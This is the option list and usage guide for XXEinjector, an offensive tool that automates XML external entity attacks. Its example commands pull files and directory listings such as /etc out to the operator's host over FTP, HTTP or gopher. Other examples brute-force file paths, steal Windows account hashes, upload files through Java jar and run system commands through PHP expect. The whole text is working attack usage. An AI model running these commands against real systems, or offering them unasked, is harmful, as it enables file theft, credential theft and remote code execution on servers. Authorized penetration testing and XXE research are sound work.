XXEinjector by Jakub Palaczynski

XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

Options:<br />
  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)<br />
  --file	Mandatory - File containing HTTP request. Entity in request file needs to point to file.dtd on XXEinjector HTTP<br /> server. Issue --xml to show sample HTTP request. (--file=/tmp/req.txt)<br />
  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)<br />
  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)<br />

  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)<br />
  --phpfilter		Use PHP filter to base64 encode target file before sending.<br />

  --hashes	Steals Windows hash of the user that runs an application.<br />
  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)<br />
  --upload	Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)<br />

  --ssl		Use SSL.<br />
  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)<br />
  --httpport	Set custom HTTP port. (--httpport=80)<br />
  --ftpport	Set custom FTP port. (--ftpport=21)<br />
  --gopherport	Set custom gopher port. (--gopherport=70)<br />
  --jarport	Set custom port for uploading files using jar. (--jarport=1337)<br />

  --timeout	Timeout for receiving file/directory content. (--timeout=20)<br />
  --fast	Skip asking what to enumerate. Prone to false-positives.<br />
  --verbose	Show verbose messages.<br />

Example usage:<br />
  Enumerating /etc directory in HTTPS application:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl<br />
  Enumerating /etc directory using gopher for OOB method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />
  Bruteforcing files using HTTP out of band method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http<br />
  Stealing Windows hashes:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes<br />
  Uploading files using Java jar:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf<br />
  Executing system commands using PHP expect:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls<br />
